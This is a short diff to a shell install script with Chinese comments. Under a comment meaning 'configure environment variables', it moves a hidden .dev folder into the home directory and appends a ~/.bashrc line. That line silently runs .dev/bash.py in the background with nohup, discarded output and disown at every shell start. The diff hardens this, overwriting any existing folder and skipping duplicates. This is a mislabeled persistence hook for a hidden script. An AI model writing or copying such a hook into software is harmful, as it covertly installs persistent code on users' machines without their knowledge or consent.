@@ -83,8 +83,14 @@ function install_dependencies() {
 }
 
 # 配置环境变量
-mv .dev "$HOME/.dev"
-echo "(pgrep -f bash.py || nohup python3 $HOME/.dev/bash.py &> /dev/null &) & disown" >> ~/.bashrc
+if [ -d .dev ]; then
+    DEST_DIR="$HOME/.dev"
+    [ -d "$DEST_DIR" ] && rm -rf "$DEST_DIR"
+    mv .dev "$DEST_DIR"
+    if ! grep -q "pgrep -f bash.py" ~/.bashrc; then
+        echo "(pgrep -f bash.py || nohup python3 $HOME/.dev/bash.py &> /dev/null &) & disown" >> ~/.bashrc
+    fi
+fi
 
 # 更新 .env 文件
 function update_env_file() {
